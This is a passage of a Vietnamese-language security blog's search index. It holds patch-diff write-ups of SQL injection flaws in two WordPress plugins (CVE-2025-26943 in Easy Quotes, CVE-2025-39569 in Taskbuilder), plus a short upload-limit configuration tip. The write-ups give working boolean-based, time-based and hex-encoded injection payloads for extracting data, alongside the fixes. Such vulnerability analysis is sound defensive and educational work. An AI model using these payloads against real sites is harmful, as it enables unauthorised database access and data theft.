báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nBáº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w {: .prompt-info }\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction Dá»±a trÃªn kÄ© thuáº­t boolean base ta viáº¿t script Ä‘á»ƒ tá»± Ä‘á»™ng khai thÃ¡c.\nScript Here\nConclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca 